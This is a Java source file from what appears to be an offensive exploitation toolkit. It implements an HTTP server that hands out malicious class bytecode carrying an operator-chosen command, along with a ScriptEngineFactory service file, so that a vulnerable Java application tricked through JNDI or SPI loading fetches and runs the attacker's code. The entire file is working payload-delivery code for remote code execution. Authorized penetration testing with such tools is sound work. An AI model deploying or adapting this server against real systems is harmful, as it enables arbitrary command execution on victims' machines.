package com.xyuxu.javasec.core.server;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import com.xyuxu.javasec.core.generator.RemotePayloadGenerator; // 保持你原有的引用

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.util.function.Consumer;

public class HTTPServer {

    private HttpServer server;
    private final String command;
    private final String className;
    private final Consumer<String> logger;
    private final boolean isSpiMode;

    public HTTPServer(int port, String command, String className, boolean isSpiMode, Consumer<String> logger) throws IOException {
        this.command = command;
        this.className = className;
        this.isSpiMode = isSpiMode;
        this.logger = logger;

        server = HttpServer.create(new InetSocketAddress(port), 0);

        server.createContext("/", new HttpHandler() {
            @Override
            public void handle(HttpExchange exchange) throws IOException {
                try {
                    String path = exchange.getRequestURI().getPath();
                    if (path.startsWith("/")) path = path.substring(1);

                    if ("favicon.ico".equals(path)) {
                        exchange.sendResponseHeaders(404, -1);
                        return;
                    }

                    String remoteIp = exchange.getRemoteAddress().getAddress().getHostAddress();
                    String method = exchange.getRequestMethod();
                    logger.accept(String.format("[HTTP] %s /%s FROM %s", method, path, remoteIp));

                    byte[] responseBytes = null;

                    // 1. SPI 配置文件
                    if ("META-INF/services/javax.script.ScriptEngineFactory".equals(path)) {
                        logger.accept("[HTTP-SPI] >> Returning Config. Target: " + className);
                        responseBytes = className.getBytes(StandardCharsets.UTF_8);
                    }
                    // 2. Class 字节码
                    else if (path.endsWith(".class")) {
                        String reqClassName = path.replace("/", ".").replace(".class", "");
                        if (reqClassName.equals(className)) {
                            if (isSpiMode) {
                                logger.accept("[HTTP] >> Generating SPI Bytecode...");
                                responseBytes = RemotePayloadGenerator.createSPIFactoryBytes(reqClassName, command);
                            } else {
                                logger.accept("[HTTP] >> Generating JNDI Bytecode...");
                                responseBytes = RemotePayloadGenerator.createJNDIFactoryBytes(reqClassName, command);
                            }
                        } else {
                            logger.accept("[HTTP] !! Name mismatch: " + reqClassName);
                        }
                    }

                    // 发送响应
                    if (responseBytes != null) {
                        if ("HEAD".equalsIgnoreCase(method)) {
                            exchange.sendResponseHeaders(200, responseBytes.length);
                        } else {
                            exchange.sendResponseHeaders(200, responseBytes.length);
                            try (OutputStream os = exchange.getResponseBody()) {
                                os.write(responseBytes);
                            }
                        }
                    } else {
                        exchange.sendResponseHeaders(404, -1);
                    }
                } catch (Exception e) {
                    logger.accept("[HTTP] Error: " + e.getMessage());
                } finally {
                    exchange.close();
                }
            }
        });
        server.setExecutor(null);
    }
    public void start() { server.start(); }
    public void stop() { if (server != null) server.stop(0); }
}